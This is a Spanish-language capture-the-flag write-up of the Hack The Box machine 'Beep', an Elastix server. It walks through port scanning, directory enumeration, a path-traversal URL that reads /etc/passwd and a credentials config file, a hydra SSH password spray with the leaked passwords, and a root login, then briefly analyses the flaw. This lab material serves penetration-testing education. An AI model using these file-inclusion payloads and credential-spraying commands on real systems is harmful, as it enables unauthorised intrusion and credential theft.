# Beep ![Avatar](https://www.hackthebox.eu/storage/avatars/995f465295b99869fce21ecadea4604c_thumb.png)

## Initial Scan
```
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: APOP RESP-CODES LOGIN-DELAY(0) PIPELINING EXPIRE(NEVER) STLS IMPLEMENTATION(Cyrus POP3 server v2) AUTH-RESP-CODE USER UIDL TOP
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: ATOMIC THREAD=ORDEREDSUBJECT ACL CHILDREN OK IMAP4 URLAUTHA0001 X-NETSCAPE LIST-SUBSCRIBED ID ANNOTATEMORE UIDPLUS Completed IMAP4rev1 CONDSTORE SORT=MODSEQ STARTTLS QUOTA NO CATENATE UNSELECT RENAME LITERAL+ NAMESPACE LISTEXT THREAD=REFERENCES IDLE RIGHTS=kxte SORT BINARY MAILBOX-REFERRALS MULTIAPPEND
443/tcp   open  ssl/https?
|_ssl-date: 2020-07-29T08:26:37+00:00; +10s from scanner time.
878/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax    HylaFAX 4.3.10
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1)
```

## Enumeration

### HTTP
#### Gobuster
```bash
gobuster -u https://10.10.10.7/ -w /usr/share/dirb/wordlists/big.txt -t 100 -k
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/admin (Status: 301)
/cgi-bin/ (Status: 403)
/configs (Status: 301)
/favicon.ico (Status: 200)
/help (Status: 301)
/images (Status: 301)
/lang (Status: 301)
/libs (Status: 301)
/mail (Status: 301)
/modules (Status: 301)
/panel (Status: 301)
/recordings (Status: 301)
/robots.txt (Status: 200)
/static (Status: 301)
/themes (Status: 301)
/vtigercrm (Status: 301)
/var (Status: 301)
```
Accediendo a la web vemos que la tecnología usada es Elastix, busquemos en Searchsploit
```
----------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                   |  Path
----------------------------------------------------------------------------------------------------------------- ---------------------------------
Elastix - 'page' Cross-Site Scripting                                                                            | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                          | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                    | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                                 | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                                                                | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                                                               | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                           | php/webapps/18650.py
----------------------------------------------------------------------------------------------------------------- ---------------------------------
```

## Exploit

Vamos a probar el LFI
```URL
https://www.exploit-db.com/exploits/37637
```
Checkeando el exploit vemos que para explotar el LFI usamos el siguiente payload
```
payload = Hostname + '/vtigercrm/graph.php?current_language=../../../../../../../../' + RouteToFile + '%00&module=Accounts&action'
```
Accedamos a /etc/passwd para enumerar usuarios con acceso via terminal
```
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action

root:x:0:0:root:/root:/bin/bash
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
spamfilter:x:500:500::/home/spamfilter:/bin/bash
fanis:x:501:501::/home/fanis:/bin/bash
```
Tenemos 6 usuarios disponibles veamos si las creds para alguno coinciden con las creds de la pagina

```
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPMGRPASS=amp111
FOPPASSWORD=passw0rd
```
Generamos una lista con los 6 usuarios y las contraseñas que tenemos y probamos con hydra
```bash
hydra ssh://10.10.10.7 -L users.txt -P passwords.txt
```
Casi inmediatamente obtenemos resultados
```
[22][ssh] host: 10.10.10.7   login: root   password: jEhdIekWmdjE
```
Cuando nos logeamos nos da un pequeño problema con el intercmabio de claves
```
no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```
Para solucionarlo y poder logearnos sin problemas con el intercambio de claves usamos el siguiente comando
```bash
ssh root@10.10.10.7 -oKexAlgorithms=+diffie-hellman-group1-sha1
```
Y ya solo nos faltaría obtener las dos flag
```
[root@beep ~]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
[root@beep ~]# wc -c root.txt 
33 root.txt
[root@beep ~]# find / -name user.txt -exec wc -c {} \; 2>/dev/null
33 /home/fanis/user.txt
```
# Analisís de la intrusiín
### Sensible data leak
Por una mala congiguración de la aplicacion web (de la propia aplicacion no de la administración) los archivos de configuración del servicio, con las contraseñas hardcodeadas ha quedado expuesto
